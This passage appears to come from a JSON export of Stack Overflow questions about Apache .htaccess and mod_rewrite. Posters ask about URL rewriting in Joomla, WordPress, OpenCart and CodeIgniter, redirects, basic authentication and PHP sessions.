specify more than catch-all.php</p>\n\n<pre><code># Internally redirect all pages to \"Catch\" page\nOptions +FollowSymLinks\nRewriteEngine on\nRewriteRule (.*) /addons/redirect/catch-all.php [L]\n</code></pre>\n\n<p>Also, do I need [L] or is it useless for internal redirects?</p>\n\n<p>Then, what php code would I use to grab the POST data, use it, and finally PHP redirect the page to the originally requested page</p>\n\n<p>Would it be done just as normal by using $_POST['variable_name']; or something different?\nThen, how would I go about calling the originally requested page, so I can tell PHP to header location direct them to that page?</p>\n\n<p>Thanks!</p>\n\n<p>UPDATE:</p>\n\n<p>Ha sick, nevermind. The condition DOES work. Here's my code:</p>\n\n<pre><code># Internally redirect all pages to \"Catch\" page\nOptions +FollowSymLinks\nRewriteEngine on\n\nRewriteCond %{REQUEST_URI} !^/robots.txt$ \nRewriteCond %{REQUEST_URI} !\\.(gif¦jpe?g¦png¦css¦js¦pdf¦doc¦xml)$\n\nRewriteCond %{REQUEST_URI} !^/addons/redirect/catch-all\\.php$\nRewriteRule (.*)$ /addons/redirect/catch-all.php?q=$1 [L]\n</code></pre>\n\n<p>Thanks guys for the inspiration!\nNow time to get that PHP to work...</p>\n"},{"tags":[".htaccess","http-status-code-404","joomla2.5","joomla-sef-urls"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":260,"score":1,"question_id":12610663,"title":"404 not found after activating Joomla 2.5 URL rewriting at localhost","body":"<p>I have a copy of my website at localhost at:</p>\n\n<pre><code>/var/www/vhosts/mysite.com/httpdocs\n</code></pre>\n\n<p>This is my /etc/apache2/sites-available/mysite</p>\n\n<pre><code>&lt;VirtualHost *:80&gt;\n        ServerAdmin webmaster@localhost\n\n        DocumentRoot /var/www/vhosts/mysite.com/httpdocs\n        &lt;Directory /&gt;\n                Options FollowSymLinks\n                AllowOverride All\n        &lt;/Directory&gt;\n        &lt;Directory /var/www/&gt;\n                Options Indexes FollowSymLinks MultiViews\n                AllowOverride All\n                Order allow,deny\n                allow from all\n        &lt;/Directory&gt;\n\n        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/\n        &lt;Directory \"/usr/lib/cgi-bin\"&gt;\n                AllowOverride None\n                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch\n                Order allow,deny\n                Allow from all\n        &lt;/Directory&gt;\n\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n\n        # Possible values include: debug, info, notice, warn, error, crit,\n        # alert, emerg.\n        LogLevel warn\n\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n    Alias /doc/ \"/usr/share/doc/\"\n    &lt;Directory \"/usr/share/doc/\"&gt;\n        Options Indexes MultiViews FollowSymLinks\n        AllowOverride None\n        Order deny,allow\n        Deny from all\n        Allow from 127.0.0.0/255.0.0.0 ::1/128\n    &lt;/Directory&gt;\n\n&lt;/VirtualHost&gt;\n</code></pre>\n\n<p>I've copied htaccess.txt to .htaccess. When I activate friendly URL and URL rewriting, I get 404 errors.</p>\n\n<p>I've uncommented this lines in .htaccess, but still does not work:</p>\n\n<pre><code>Options +FollowSymLinks\nRewriteEngine On\nRewriteBase /\n</code></pre>\n\n<p>I also tried to change rewritebase to</p>\n\n<pre><code>RewriteBase /mysite\n</code></pre>\n\n<p>with no luck.</p>\n\n<p>What I'm doing wrong?</p>\n"},{"tags":["php","css",".htaccess","dynamic"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12895926,"title":"Htaccess wrongly making 301 redirect","body":"<p>I'm just trying to display css content at <a href=\"http://mydomain.com/dynamic_css/presets/\" rel=\"nofollow\">http://mydomain.com/dynamic_css/presets/</a>\nwhen user's browser loads <a href=\"http://mydomain.com/css/dynamic.css\" rel=\"nofollow\">http://mydomain.com/css/dynamic.css</a> using the following</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^dynamic\\.css$ http://mydomain.com/dynamic_css/presets/ [QSA,L]\n</code></pre>\n\n<p>But instead browser gets http 301 redirected to <a href=\"http://mydomain.com/dynamic_css/presets/\" rel=\"nofollow\">http://mydomain.com/dynamic_css/presets/</a></p>\n\n<p>Any idea why ?</p>\n\n<p>Basically, the script at <a href=\"http://mydomain.com/dynamic_css/presets/\" rel=\"nofollow\">http://mydomain.com/dynamic_css/presets/</a> shows up a CSS generated code to allow more styles control from admin settings.</p>\n"},{"tags":["php",".htaccess","drupal","drupal-6","drupal-7"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12896039,"title":"Drupal cross domain access","body":"<p>Can anybody tell me how should i use cross domain access on drupal. I have used this line as htaccess Header set Access-Control-Allow-Origin *  to allow cross domain on my hostgator account. When i use this line in drupal's htaccess file it dosent work, Can anyone tell how should i allow cross domain on drupal. I have to use jquery ajax function with cross domain access enabled on server side.</p>\n\n<p>Thankyou.</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":10646748,"title":"Is it possible to redirect a url(not in my domain) to another using htaccess?","body":"<p>I was using a third party online store and had a particular url assigned for the store.\nNow I have changed the third party and have a new store url.\nBut, some people whose browser has cached the old url still use it. </p>\n\n<p>So, is there a way to redirect the old url to the new one?\nBoth are store urls assigned to me but they are not in my domain.</p>\n\n<p>Or, is there a way to forcibly empty the browser cache?</p>\n\n<p>Thanks</p>\n"},{"tags":[".htaccess","mod-rewrite","opencart"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12894412,"title":"opencart .htacess mod_rewrite issue","body":"<p>I am using mode rewrite on an open cart system for seo url-s, its working great according to the links. BUT i have a php code in the header:</p>\n\n<pre><code>&lt;?php\n$request = new Request();\nif ( !isset($request-&gt;get['route']) ||  $request-&gt;get['route']=='common/home' ) { ?&gt;\n&lt;div class=\"center-main\"&gt;\n&lt;?php }else {?&gt;\n&lt;div class=\"center-mainbg\"&gt;\n</code></pre>\n\n<p>so if its not common/home, the div should inject <code>&lt;div class=\"center-mainbg\"&gt;</code>\nand this rule doesent seams to work when mode rewrite is on, it is keeping the \n<code>&lt;div class=\"center-main\"&gt;</code> rule...</p>\n\n<p>The htaccess rule for mod_rewrite looks like this:</p>\n\n<pre><code>RewriteBase /\nRewriteRule sitemap.xml /index.php?route=feed/google_sitemap\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA]\n</code></pre>\n"},{"tags":["php","wordpress",".htaccess","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12891509,"title":"Wordpress blog articles error 404","body":"<p>inside the blog of two wordpress sites</p>\n\n<p><a href=\"http://www.winegood.it/article/fenomenolofia-del-vino-sfuso/\" rel=\"nofollow\">http://www.winegood.it/article/fenomenolofia-del-vino-sfuso/</a></p>\n\n<p><a href=\"http://www.ilvinomeloimbottiglioio.it/article/fenomenolofia-del-vino-sfuso/\" rel=\"nofollow\">http://www.ilvinomeloimbottiglioio.it/article/fenomenolofia-del-vino-sfuso/</a></p>\n\n<p>you can't read the articles (error 404, but articles are online, you can see a short text of them into blog page): I used a php plugin that allowed me to change the layout of the blog, long ago everything worked properly..\nIf I change the permalink (now I'm on /%postname%/) everything works again, but I don't want to change them from postname (it would mess things). Any idea about how I can fix it? If you need them I can post the php files.</p>\n\n<hr>\n\n<p>.htaccess</p>\n\n<pre><code>SetEnv PHP_VER 5\nSetEnv REGISTER_GLOBALS 0\n\n# BEGIN WordPress\n\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\n\n\n# uploaded files\nRewriteRule ^files/(.+) wp-includes/ms-files.php?file=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule . index.php [L]\n\n# END WordPress\n</code></pre>\n"},{"tags":[".htaccess","url","redirect","web"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12893669,"title":"Redirect to a page if URL contains string","body":"<p>My business has been bought-out. As such we are re-branding and changing the URL's of our sites. I have 2 URL's pointing to one web server (the old, original URL and the new URL) and what I would like to do is have script on my pages to see if my user has visited the old URL. If they have I would then like them to be redirected to a particular html page to tell them that the site has changed and that they need to update their favourites. I do not want the redirect to be automated.</p>\n\n<p>Basically any time the old URL is detected I would like them redirected to the redirect page to inform them</p>\n\n<p>IF URL contains 'dls.myOLDwebsite.co.uk' THEN REDIRECT to: 'dls.mywebsite.co.uk/redirect.html'</p>\n\n<p>The reason I would like to do this is because if the user is going to the new, correct address (example; dls.myNEWwebsite.co.uk) then I don't want any redirects or messages.</p>\n\n<p>Can anyone assist?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12888820,"title":"Rewrite URL based on HTTP_HOST","body":"<p>Basically I want users can access the page via intranet and internet.</p>\n\n<p>If users access the page via intranet, they can typing intranet IP of server on their browser address bar to <strong><code>192.168.x.x</code></strong>.</p>\n\n<p>But when users access the page via internet, they can typing public IP of server, I will rewrite the URL to public IP of server.</p>\n\n<p>I have tried this, but I get the page <strong>not properly redirected</strong>.</p>\n\n<pre><code>RewriteEngine   On\nRewriteBase     /mypath/\nRewriteCond     %{REQUEST_FILENAME} !-f\nRewriteCond     %{REQUEST_URI}      !(.*)/$\nRewriteCond     %{REQUEST_METHOD}   GET\nRewriteCond     %{HTTP_HOST}        !192.168.0.1\nRewriteRule     ^(.*)$          http://&lt;public.ip.of.server&gt;/mypath/$1/ [L,R=301]\nRewriteCond     %{HTTP_HOST}        !&lt;public.ip.of.server&gt;\nRewriteRule     ^(.*)$          http://192.168.0.1/mypath/$1/   [L,R=301]\n</code></pre>\n\n<p>I have tried this too, but I get the page <strong>500 internal server error</strong>.</p>\n\n<pre><code>&lt;If \"%{HTTP_HOST} == '192.168.0.1'\"&gt;\nRewriteEngine   On\nRewriteBase     /mypath/\nRewriteCond     %{REQUEST_FILENAME} !-f\nRewriteCond     %{REQUEST_URI}      !(.*)/$\nRewriteCond     %{REQUEST_METHOD}   GET\nRewriteRule     ^(.*)$          http://192.168.0.1/mypath/$1/   [L,R=301]\n&lt;/If&gt;\n&lt;If \"%{HTTP_HOST} == 'public.ip.of.server'\"&gt;\nRewriteEngine   On\nRewriteBase     /mypath/\nRewriteCond     %{REQUEST_FILENAME} !-f\nRewriteCond     %{REQUEST_URI}      !(.*)/$\nRewriteCond     %{REQUEST_METHOD}   GET\nRewriteRule     ^(.*)$          http://&lt;public.ip.of.server&gt;/mypath/$1/ [L,R=301]\n&lt;/If&gt;\n</code></pre>\n\n<p>Am I doing something wrong?</p>\n"},{"tags":["php",".htaccess","authentication","subdirectories","htpasswd"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":12888474,"title":"Authentication multiple files","body":"<p>So rather than excluding one file from the entire authentication like I tried to <a href=\"http://stackoverflow.com/questions/12865543/password-protecting-web-directories-and-files\">here</a>. I've just decided to add specific files to the authentication like this:</p>\n\n<pre><code>&lt;Files ...&gt;\n&lt;/Files&gt;\n</code></pre>\n\n<p>The thing is when it's like this:</p>\n\n<pre><code>&lt;Files Available.php&gt;\n    AuthType Basic\n    AuthName \"Login\"\n    AuthUserFile /disks/*/*/Folder/.htpasswd\n    Require valid-user\n&lt;/Files&gt;\n</code></pre>\n\n<p>It works in that it requires an authentication for the php. However when I put multiple files like this:</p>\n\n<pre><code>&lt;Files Available.php,Insert.php,upload_file.php&gt;\n    AuthType Basic\n    AuthName \"Login\"\n    AuthUserFile /disks/*/*/Folder/.htpasswd\n    Require valid-user\n&lt;/Files&gt;\n</code></pre>\n\n<p>It fails to require authentication for any of the files. Any ideas what I'm writing wrong syntactically? <br><br>Also how do I require authentication for all sub-directories?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12887898,"title":"Redirect Rule in htaccess for a folder","body":"<p>I have a wordpress hosting site www.mysite.com/myBlog . The wordpress installation is done inside public_html/www/myBlog folder inside my host folder. </p>\n\n<p>I also have a folder public_html/www/myName which redirects me to a domain myName.com</p>\n\n<p>Although this works fine but inside myName folder i have files like index.html. acad.html, worexp.html </p>\n\n<p>clicking on them i expect a behavior like </p>\n\n<p>myName.com/index.html\nmyName.com/acad.html\nmyName.com/workex.html</p>\n\n<p>though i get it as myname.com only. </p>\n\n<p>I found htaccess rules in myName folder as : </p>\n\n<pre><code>Redirect http://mydomainName.com/myName/+ \n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n\nRewriteCond %{HTTP_HOST} ^mydomainName.com$\nRewriteRule ^/?$ \"http\\:\\/\\/www\\.mydomainName\\.com\\/myBlog\" [R=301,L]\n</code></pre>\n\n<p>Can anyone help me with whats wrong with the htaccess file ?</p>\n\n<p>Thank you </p>\n"},{"tags":["php","mysql",".htaccess","mod-rewrite"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":82,"score":4,"question_id":12865675,"title":"creating thousands of urls through mod-rewrite","body":"<p>I'm programming a website which has a lot of users stored in a mysql_database where each user has an ID and profilename (like <strong>jim.button.1</strong>) among other fields. I want an url (which get's the profile through e.g a mysql_select on the userID) that has this structure: <strong>www.mysite.com/jim.button.1</strong></p>\n\n<p>Now I know that I could do that with a mod_rewrite_rule, but with thousands of users I'll get a very large .htaccess file. I'm not by far an expert in mod rewrite by the way, but I understand how it works.</p>\n\n<p>Is there a way to do this, say in one or two mod_rewrite_rules or is there another smart way to accomplish this?</p>\n\n<p>All help is welcome.</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","links"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":38,"score":2,"question_id":12885811,"title":"Having some issues with mod rewrite","body":"<pre><code>Options +FollowSymLinks  \nRewriteEngine On  \nRewriteCond %{SCRIPT_FILENAME} !-d  \nRewriteCond %{SCRIPT_FILENAME} !-f  \nRewriteRule ^profile/(\\w+)/*$ ./index.php?page=showuser&amp;username=$1\n</code></pre>\n\n<p>Okay, so I have this code that will rewrite my URL exactly how it want it to (sitename/profile/username). </p>\n\n<p>Now let's say I want to access only (sitename/profile/). What rule do I have to write in order for that to work and not give me an error?</p>\n\n<p>I am new to mod rewrite so I am sorry if this question seem stupid to some of you.</p>\n"},{"tags":["apache",".htaccess","magento","logging","trace"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12881356,"title":"How do I debug the htaccess processes","body":"<p>My magento store has this in the htaccess:</p>\n\n<pre><code>## TRACE and TRACK HTTP methods disabled to prevent XSS attacks\nRewriteCond %{REQUEST_METHOD} ^TRAC[EK]\nRewriteRule .* - [L,R=405]\n</code></pre>\n\n<p>I would like to log what is going on in my htaccess process. I have tried adding this code:</p>\n\n<pre><code>RewriteLog \"/var/log/apache2/rewrite.log\"\nRewriteLogLevel 2\n</code></pre>\n\n<p>But I'm getting an \"Internal Server Error\" or a Not Found erro when run it with the RewriteLog lines.</p>\n\n<p>Any tips / help? </p>\n\n<p>Thanks!</p>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12884513,"title":"Url rewrite not funtioning in subdirectory creation runtime show blank page","body":"<p>I am working on my some project.Main issue which I face is url rewriting through .htaccess\nI just want to write \n<code>http://www.domain.com.au/servives.php?alphabet=a</code> to <code>http://www.domain.com.au/cat/alphabet/a.htm</code> using the rule  <code>RewriteRule ^cat/alphabet/([^/]+)\\.htm$ /services.php?alphabet=$1 [NC,PT]</code> </p>\n\n<h2>My Total .htaccess file contains</h2>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\nOptions +Indexes\nRewriteBase /\n\n\n//commented// This rule to resolve cononicalization\n\nRewriteCond %{HTTP_HOST} ^domain.com.au\nRewriteRule (.*) http://www.domain.com.au/$1 [R=301,L]\nRewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\\ /index\\.php\\ HTTP/\nRewriteRule ^index\\.php$ http://www.domain.com.au/ [R=301,L]\nRewriteRule ^cat/alphabet/([^/]+)\\.htm$ /services.php?alphabet=$1 [NC,PT]\n</code></pre>\n\n<p>But, this opens a blank page when I type In browser <a href=\"http://www.domain.com.au/cat/alphabet/a.htm\" rel=\"nofollow\">http://www.domain.com.au/cat/alphabet/a.htm</a>\nopens a blank page but it contains source code show no errors but still blank.</p>\n\n<p>If I add additional parameter of [R] then it redirect to the original page external redirect work fine. I spend atleast week in it and so confused.your help is so appreciated .\nit redirects with this (with additional R flag)  </p>\n\n<p><code>RewriteRule ^cat/alphabet/([^/]+)\\.htm$ /services.php?alphabet=$1 [NC,R]</code> </p>\n\n<p>Why its not redirect internally?</p>\n"},{"tags":[".htaccess","codeigniter","controller","routes"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12884386,"title":"Codeigniter - newbie controller & routes","body":"<p>This is my first time using CI and I just walked through the tutorial. </p>\n\n<p>According to the tutorial, it is possible to handle all the requests for static pages through application/controllers/pages.php</p>\n\n<pre><code>class Pages extends CI_Controller {\n\n    public function view($page = 'home')\n    {\n        if( ! file_exists('application/views/pages/'.$page.'.php'))\n        {\n            // Whoops, we don't have a page for that!\n            show_404();\n        }\n\n        $data['title'] = ucfirst($page); // Capitalize the first letter\n\n        $this-&gt;load-&gt;view('templates/header', $data);\n        $this-&gt;load-&gt;view('templates/nav', $data);\n        $this-&gt;load-&gt;view('pages/'.$page, $data);\n        $this-&gt;load-&gt;view('templates/aside_right', $data);\n        $this-&gt;load-&gt;view('templates/bottom', $data);\n    }\n}\n</code></pre>\n\n<p>I just don't get how it works. This works for the \"home\"-page, but I don't seem to be able to call views/pages/about for example. </p>\n\n<p>I tried to make a seperate controller for the about-page. It works, but it feels somewhat wrong.</p>\n\n<p>application/controllers/about.php</p>\n\n<pre><code>class About extends CI_Controller {\n\n    public function index()\n    {\n        $this-&gt;load-&gt;view('templates/header');\n        $this-&gt;load-&gt;view('templates/nav');\n        $this-&gt;load-&gt;view('pages/about');\n        $this-&gt;load-&gt;view('templates/aside_right');\n        $this-&gt;load-&gt;view('templates/bottom');\n    }\n} \n</code></pre>\n\n<p>I also seem to have issues with my htaccess file or routes file. With the About-controller written above, I can only get to the page by typing domain.com/index.php/about. I'd like it to be domain.com/about etc.</p>\n\n<p>This is what my routes.php's like:</p>\n\n<pre><code>$route['about'] = 'about';\n$route['(:any)'] = 'pages/view/$1';\n$route['default_controller'] = 'pages/view';\n</code></pre>\n\n<p>My Htaccess: </p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\n# Hide the application and system directories by redirecting the request to index.php\nRewriteRule ^(application|system|\\.svn) index.php/$1 [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [QSA,L] \n</code></pre>\n\n<p>Glad for some hints and I'm sorry for all my mistakes!</p>\n"},{"tags":["apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12883061,"title":"DirectoryIndex not working","body":"<p>I have the following .htaccess file, but my DirectoryIndex is not working. I want mysite.com to redirect to mysite.com/index, because this </p>\n\n<p><code>RewriteCond %{REQUEST_FILENAME} !-f [OR]</code> </p>\n\n<pre><code>RewriteCond {REQUEST_FILENAME} (bedrijf.php)$\nRewriteRule ^(.*)$ bedrijf.php?query=$1 [L]\n</code></pre>\n\n<p>Is causing mysite.com to redirect to bedrijf.php with an empty query. Do I need to edit the code above so that mysite.com isn't redirected to bedrijf.php ?</p>\n\n<pre><code>ErrorDocument 404 /404.php\n\nRewriteRule ^aanbiedinginformatie$ aanbiedinginformatie.php\nRewriteRule ^algemenevoorwaarden$ algemenevoorwaarden.php\n\nRewriteRule ^contact$ contact.php\nRewriteRule ^disclaimer$ disclaimer.php\nRewriteRule ^faq$ faq.php\nRewriteRule ^index$ index.php\nRewriteRule ^informatie$ informatie.php\nRewriteRule ^inloggen-bedrijven$ inloggen-bedrijven.php\nRewriteRule ^inloggen-consument$ inloggen-consument.php\nRewriteRule ^nieuws$ nieuws.php\nRewriteRule ^(.*)-nieuws$ bekijknieuws.php?id=$1\nRewriteRule ^(.*)-(.*)-persbericht$ persbericht.php?id=$1&amp;bedrijf=$2\nRewriteRule ^persberichteninformatie$ persberichteninformatie.php\nRewriteRule ^privacy$ privacy.php\nRewriteRule ^registreren-bedrijven$ registreren-bedrijven.php\nRewriteRule ^registreren-bedrijven-stap-2$ registreren-bedrijven-stap-2.php\nRewriteRule ^registreren-bedrijven-stap-3$ registreren-bedrijven-stap-3.php\nRewriteRule ^registreren-bedrijven-stap-4$ registreren-bedrijven-stap-4.php\nRewriteRule ^registreren-bedrijven-stap-5$ registreren-bedrijven-stap-5.php\nRewriteRule ^registreren-consument$ registreren-consument.php\nRewriteRule ^vacatureinformatie$ vacatureinformatie.php\nRewriteRule ^(.*)-vacatures$ vacatures.php?id=$1\n\nRewriteRule ^zoeken-op-(.*)$ zoeken.php?query=$1\nRewriteRule ^zoeken-in-(.*)$ zoeken.php?plaats=$1\nRewriteRule ^zoeken-q-(.*)-in-(.*)$ zoeken.php?query=$1&amp;plaats=$2\n\nRewriteRule ^(.*)-vacatures-zoeken$ zoekenvac.php?query=$1\nRewriteRule ^(.*)-in-(.*)-vacatures$ zoekenvac.php?query=$1&amp;plaats=$2\nRewriteRule ^vacatures-in-(.*)$ zoekenvac.php?plaats=$1 \n\nRewriteRule ^(.*)-aanbiedingen$ zoekenaan.php?query=$1\nRewriteRule ^(.*)-aanbiedingen-in-(.*)$ zoekenaan.php?query=$1&amp;plaats=$2\nRewriteRule ^aanbiedingen-in-(.*)$ zoekenaan.php?plaats=$1\n\nRewriteRule ^(.*)-persberichten$ zoekenpers.php?query=$1\nRewriteRule ^persberichten-in-(.*)$ zoekenpers.php?plaats=$1\nRewriteRule ^(.*)-persberichten-in-(.*)$ zoekenpers.php?query=$1&amp;plaats=$2\n\nRewriteRule ^bedrijven-in-(.*)$ zoeken.php?plaats=$1\n\nRewriteRule ^control/consument$ control/consument.php\nRewriteRule ^control/consument-mijngegevens$ control/consument-mijngegevens.php\nRewriteRule ^control/consument-wachtwoord$ control/consument-wachtwoord.php\nRewriteRule ^control/consument-cv$ control/consument-cv.php\nRewriteRule ^control/consument-reacties$ control/consument-reacties.php\nRewriteRule ^control/consument-reviews$ control/consument-reviews.php\nRewriteRule ^control/logout$ control/logout.php\n\nRewriteRule ^control/bedrijven$ control/bedrijven.php\nRewriteRule ^control/bedrijven-aanbieding$ control/bedrijven-aanbieding.php\nRewriteRule ^control/bedrijven-facturen$ control/bedrijven-facturen.php\nRewriteRule ^control/bedrijven-fotos$ control/bedrijven-fotos.php\nRewriteRule ^control/bedrijven-kortingscode$ control/bedrijven-kortingscode.php\nRewriteRule ^control/bedrijven-kortingscode-bewerken-(.*)$ control/bedrijven-    kortingscode-bewerken.php?id=$1\nRewriteRule ^control/bedrijven-kortingscode-verwijderen-(.*)$ control/bedrijven-    kortingscode-verwijderen.php?id=$1\nRewriteRule ^control/bedrijven-wachtwoord$ control/bedrijven-wachtwoord.php\nRewriteRule ^control/bedrijven-pakket$ control/bedrijven-pakket.php\nRewriteRule ^control/bedrijven-persbericht$ control/bedrijven-persbericht.php\nRewriteRule ^control/bedrijven-persbericht-bewerken-(.*)$ control/bedrijven-   persbericht-bewerken.php?id=$1\nRewriteRule ^control/bedrijven-persbericht-verwijderen-(.*)$ control/bedrijven- persbericht-verwijderen.php?id=$1\nRewriteRule ^control/bedrijven-profiel$ control/bedrijven-profiel.php\nRewriteRule ^control/bedrijven-vacatures$ control/bedrijven-vacatures.php\nRewriteRule ^control/bedrijven-vacatures-bekijk-(.*)$ control/bedrijven-vacatures- bekijk.php?id=$1\nRewriteRule ^control/bedrijven-vacatures-bewerken-(.*)$ control/bedrijven-vacatures-   bewerken.php?id=$1\nRewriteRule ^control/bedrijven-vacatures-verwijderen-(.*)$ control/bedrijven-vacatures-verwijderen.php?id=$1\nRewriteRule ^control/logoutb$ control/logoutb.php\n\nRewriteCond %{REQUEST_FILENAME} !-f [OR]\nRewriteCond {REQUEST_FILENAME} (bedrijf.php)$\nRewriteRule ^(.*)$ bedrijf.php?query=$1 [L]\n\nRewriteRule ^branche(.*)-(.*)$ zoekenbranche.php?id=$1\n</code></pre>\n"},{"tags":["javascript",".htaccess","redirect","iframe"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12882675,"title":"find redirect url","body":"<p>I am using an <code>iframe</code> in my page to display content from an external website, but sometimes the iframe redirects a whole page to a new location, and this causes unwanted things on my website.</p>\n\n<p>Is it possible to find the page where the <code>iframe</code> is going to redirect my website? if so, give me a basic example on how to find this redirection address. I would like to open this address in a new tab, because information from this address may be useful for my users.</p>\n\n<p><strong>www.b.com [ abstract code ] :</strong></p>\n\n<pre><code>if(somethingHappens) window.top.location.href = \"http://google.com\";\n</code></pre>\n\n<p><strong>www.a.com [ abstract code ]:</strong></p>\n\n<pre><code>&lt;!-- code --&gt;\n  &lt;iframe src=\"http://www.b.com\"&gt;&lt;/iframe&gt;\n&lt;!-- code --&gt;\n</code></pre>\n\n<p><strong>Expected Result [ abstract code ]:</strong></p>\n\n<pre><code>if(pageIsBeingRedirected) {\n  stopRedirection();\n  var url = findRedirectAddres(); // expected : http://google.com\n  window.open(url, \"_blank\");\n  return;\n}\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":10354421,"title":"My $_SESSION['vars'] don't seem to work","body":"<p>I'm using a <code>$_SESSION['loggedIn']= true</code> that does not seem to be saved.\nI use <code>session_start()</code> before I save it . I can echo the variable straight after and is set, but, as soon as I change the page, the variable is gone. I also use <code>session_start()</code> before I read it in the other page...</p>\n\n<p>Now, I have a .htaccess file like this:</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-d\n\nRewriteCond %{REQUEST_FILENAME} !-f\n\nRewriteCond %{REQUEST_FILENAME} !-l\n\nRewriteRule ^(.+)$  index.php?v=$1 [QSA,L]\n</code></pre>\n\n<p>ok.. So this is index.php</p>\n\n<pre><code>@session_start();\n\ndefine(\"x_app\", \"1\");\n\ndefine('X_BASE', dirname(__FILE__));\n\nrequire_once X_BASE.'/config/config.php';\n\ninclude \"classes/browser.php\";\n\n$browser = new Browser();\n\n$browser-&gt;setBrowserCookie();\n\n$_SESSION['browser'] = $browser;\n\n$_SESSION['language'] = \"english\";\n\n//Getting View\n\n$v = explode('/', $_GET['v']);\n\n$view = $v[0];\n\n\n\nAfter this I load the view..\nIn this case Login, which is loaded by a require function\n\n\n\n\ndefined('x_app') or die;\n\nrequire('helper.php');\n\n$email = $_POST['email'];\n\n$password = $_POST['password'];\n\n\n\nif(isset($_SESSION['loggedIn']) &amp;&amp; $_SESSION['loggedIn'] == true){\n\n    //Redirect to my portfolio landing page\n\n}\n\nelse{ //Not Logged In\n\n\n    //Process Form\n    if(isset($_POST['email']) &amp;&amp; isset($_POST['password'])){\n\n        $xLogin = new X_Login();\n\n        if($xLogin-&gt;login($email, $password) == true){\n\n            echo 'User is logged In';\n\n            //@session_start() ---&gt; should I put this here again? Don't think so...\n            // ! This is the variable that I can't save \n            $_SESSION['loggedIn'] = true;\n\n                    // ! I have an echo here but if change the page, it gets lost\n            echo 'session-&gt;'.$_SESSION['loggedIn'];\n\n        }else{\n\n            echo 'User is not logged in';\n\n        }\n\n    }\n    //Error in Form\n\n    elseif(!isset($_POST['email']) || !isset($_POST['password'])){\n\n        $error = \"Login Error\";\n\n        include('views/default.php');\n\n    }\n\n\n}\n</code></pre>\n\n<p>This is the cookie function</p>\n\n<p>public function setBrowserCookie(){</p>\n\n<pre><code>if(empty($_COOKIE['verifyUser'])){  \n\n$ip = $_SERVER['REMOTE_ADDR'];\n\n$ub = $this-&gt;getBrowser(); \n\n@setcookie(\"verifyUser\", $ip.$ub, time()+31536000);\n\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Could  this be affecting the path where the session variables are saved? If so, how can I fix it?</p>\n\n<p>Thanks in advance...</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12879730,"title":"I don't want to use the .htaccess file any more","body":"<p>I don't want to use the .htaccess file any more.\nI want to edit the code to be able to work without the htaccess file.</p>\n\n<p>The content of my htaccess file is:</p>\n\n<hr>\n\n<pre><code>RewriteEngine on\n\nRewriteRule ^(.*)-(.*)-(.*)$   index.php?page=$1&amp;id=$2&amp;im=$3\n</code></pre>\n\n<hr>\n\n<p>Anybody can help me 